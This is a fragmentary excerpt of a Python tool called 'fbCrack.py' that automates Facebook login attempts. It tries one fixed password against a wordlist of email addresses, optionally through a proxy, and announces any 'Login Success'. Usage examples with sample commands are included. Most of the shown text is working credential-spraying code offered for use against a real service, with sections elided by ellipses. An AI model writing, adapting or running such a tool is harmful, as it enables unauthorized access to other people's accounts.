...
class FaceBoom(object):
    ...
    def login(self,target, password):
        ...
        try:
            ...
            self.br.form['pass']=target
            self.br.form['email']= password
            self.br.method ="POST"
...
Usage: python ./fbCrack.py [OPTIONS...]

OPTIONS:
|--------
| -t <target password>     ::> Specify Password
|--------
...
Examples:
|--------
| python fbCrack.py -t 123456 -w ./emails.txt
|--------
| python fbCrack.py -t 123456 -w ./emails.txt -p IP:PORT
|--------
""")
   ...
   if update:
    ...
    sys.exit(1)
        ...
        for passwd in passwords:
                ...
                write(wi+"["+yl+str(loop)+wi+"] Trying email[ {"+yl+str(passwd)+wi+"} ]")
                retCode = faceboom.login(target, passwd)
                if retCode:
                    sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    print(wi+"["+gr+"+"+wi+"] Email [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
                    print(wi+"========================="+"="*len(passwd)+"======")
                ...
                if single_passwd:
                    ...
                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Email In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
